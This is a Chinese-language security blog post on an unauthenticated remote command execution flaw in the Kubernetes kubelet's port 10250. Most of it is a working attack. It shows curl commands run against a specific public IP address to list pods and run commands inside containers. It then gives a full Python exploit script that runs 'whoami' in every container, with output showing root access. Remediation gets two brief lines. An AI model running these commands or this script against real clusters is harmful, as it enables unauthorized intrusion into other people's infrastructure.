---
layout: post
title: "Kublete 远程命令执行漏洞"
date: 2018-03-22
description: "Kublete 远程命令执行漏洞"
tag: 应用安全
---

------
## Kublete简介
Kublete是Kubernetes的核心组件之一，每个节点上都运行一个kubelet服务进程，默认监听`10250端口`，接收并执行master发来的指令，管理Pod及Pod中的容器。每个kubelet进程会在API Server上注册节点自身信息，定期向master节点汇报节点的资源使用情况，并通过cAdvisor监控节点和容器的资源。

## 漏洞详情
Kublete默认对外开放https：10250端口，此端口允许远程用户在容器内执行任意命令。

## 漏洞复现
### 1.使用`https:/url:10250/runningpods`命令获得Kubelet节点中的namespaces，pods，containers
  [https://52.33.149.246:10250/runningpods](https://52.33.149.246:10250/runningpods)
![runningpods](/images/posts/app_sec/runningpods_20180322191728.png)
使用curl命令获取：
```
root@ubuntu:~# curl -sk https://52.33.149.246:10250/runningpods/|python -mjson.tool
{
    "apiVersion": "v1",
    "items": [
        {
            "metadata": {
                "creationTimestamp": null,
                "name": "kube-scheduler-ip-172-20-57-21.us-west-2.compute.internal",
                "namespace": "kube-system",
                "uid": "224fcc017eb87e9c15638892d096fb14"
            },
            "spec": {
                "containers": [
                    {
                        "image": "gcr.io/google_containers/kube-scheduler@sha256:4dcf7b2872bd9086ce236535bf03d2077252aebedbcad5de324042edd428f478",
                        "name": "kube-scheduler",
                        "resources": {}
                    }
                ]
            },
            "status": {}
        },
        {
            "metadata": {
                "creationTimestamp": null,
                "name": "etcd-server-events-ip-172-20-57-21.us-west-2.compute.internal",
                "namespace": "kube-system",
                "uid": "3617385b0c07e6aff49eebf6bac22f07"
            },
            "spec": {
                "containers": [
                    {
                        "image": "gcr.io/google_containers/etcd@sha256:19544a655157fb089b62d4dac02bbd095f82ca245dd5e31dd1684d175b109947",
                        "name": "etcd-container",
                        "resources": {}
                    }
                ]
            },
            "status": {}
        }
    ],
    "kind": "PodList",
    "metadata": {}
}
```
### 2.使用`https:/url:10250/run/%namespace%/%pod_name%/%container_name%`在容器内执行命令
```
root@ubuntu:~# curl -sk https://52.33.149.246:10250/run/kube-system/kube-controller-manager-ip-172-20-57-21.us-west-2.compute.internal/kube-controller-manager -d "cmd=ifconfig"
cbr0      Link encap:Ethernet  HWaddr 0A:58:64:60:00:01  
          inet addr:100.96.0.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::60b7:58ff:feea:fbd7/64 Scope:Link
          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:9001  Metric:1
          RX packets:1581479 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1876816 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:295246612 (281.5 MiB)  TX bytes:226906895 (216.3 MiB)

docker0   Link encap:Ethernet  HWaddr 02:42:80:CE:38:05  
          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0
          UP BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)

eth0      Link encap:Ethernet  HWaddr 02:1F:6E:5C:7A:B0  
          inet addr:172.20.57.21  Bcast:172.20.63.255  Mask:255.255.224.0
          inet6 addr: fe80::1f:6eff:fe5c:7ab0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:19750608 errors:0 dropped:0 overruns:0 frame:0
          TX packets:20144402 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:4244497702 (3.9 GiB)  TX bytes:8686377212 (8.0 GiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:119991412 errors:0 dropped:0 overruns:0 frame:0
          TX packets:119991412 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:53782485827 (50.0 GiB)  TX bytes:53782485827 (50.0 GiB)

veth11e06f57 Link encap:Ethernet  HWaddr 2A:2D:BE:D7:69:A8  
          inet6 addr: fe80::282d:beff:fed7:69a8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:1581479 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1876824 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:317387318 (302.6 MiB)  TX bytes:226907543 (216.3 MiB)
```
## 漏洞利用脚本
kubelet_rce.py:
```python
#! /usr/bin/python
# _*_ coding:utf-8 _*_

import requests
import json

'''
导入InsecureRequestWarning，取消以下报错
InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. 
See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings InsecureRequestWarning)
'''
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 执行命令：/run/%namespace%/%pod_name%/%container_name%
def execCmd(url, namespace, pod, container):
    payload = {
        "cmd": "whoami"
    }
    url = url + "/run" + "/" + namespace + "/" + pod + "/" + container

    # container 为POD时执行命令错误,暂未发现成功案例
    # Error executing in Docker Container: 126
    if container == "POD":
        return

    try:
        r = requests.post(url, timeout=5, verify=False, data=payload)
        if "Error executing in Docker Container" in r.text:
            print u"[-] %s/%s/%s 执行错误：" %(namespace, pod, container) + "\n    " + str(r.text)
        else:
            print u"[+] %s/%s/%s 执行成功：" %(namespace, pod, container) + "\n    " + str(r.text)

    except Exception, e:
        print "[-] execCmd: " + str(e)


# 得到pods，containers，namespace：/runningpods/
def getResouces(url):
    url1 = url + '/runningpods'
    try:
        r = requests.get(url1, timeout=5, verify=False)
        result = json.loads(r.text)

        items = result['items']
        for item in items:
            namespace = item['metadata']['namespace']
            pod = item['metadata']['name']
            containers = item['spec']['containers']

            for container in containers:
                container_name = container['name']
                # print "[*] namespace, pod, container: %s, %s, %s" %(namespace, pod, container_name)
                execCmd(url, namespace, pod, container_name)

    except Exception, e:
        print "[-] getResouces: " + str(e)


if __name__ == "__main__":
    url = "https://52.33.149.246:10250"
    print "[*] url: " + url
    getResouces(url)
```
执行结果如下：
```
C:\Python27\python.exe kublete_rce.py
[*] url: https://52.33.149.246:10250
[+] kube-system/dns-controller-df557c98d-6zrsd/dns-controller 执行成功：
    root

[+] kube-system/kube-scheduler-ip-172-20-57-21.us-west-2.compute.internal/kube-scheduler 执行成功：
    root

[+] kube-system/etcd-server-events-ip-172-20-57-21.us-west-2.compute.internal/etcd-container 执行成功：
    root

[+] kube-system/etcd-server-ip-172-20-57-21.us-west-2.compute.internal/etcd-container 执行成功：
    root

[+] kube-system/kube-proxy-ip-172-20-57-21.us-west-2.compute.internal/kube-proxy 执行成功：
    root

[+] kube-system/kube-apiserver-ip-172-20-57-21.us-west-2.compute.internal/kube-apiserver 执行成功：
    root

[+] kube-system/kube-controller-manager-ip-172-20-57-21.us-west-2.compute.internal/kube-controller-manager 执行成功：
    root

[+] kube-system/kubernetes-dashboard-7798c48646-8xtpz/kubernetes-dashboard 执行成功：
    command 'whoami' exited with 126: 
```
## 漏洞修复
### 1.kubelet 添加认证
![kubelet认证](/images/posts/app_sec/kubelet_verify_20180322194520.png)
参考链接：[https://jimmysong.io/kubernetes-handbook/guide/kubelet-authentication-authorization.html](https://jimmysong.io/kubernetes-handbook/guide/kubelet-authentication-authorization.html)
### 2. 配置防火墙，限制访问

## 参考链接
[https://github.com/kayrus/kubelet-exploit](https://github.com/kayrus/kubelet-exploit)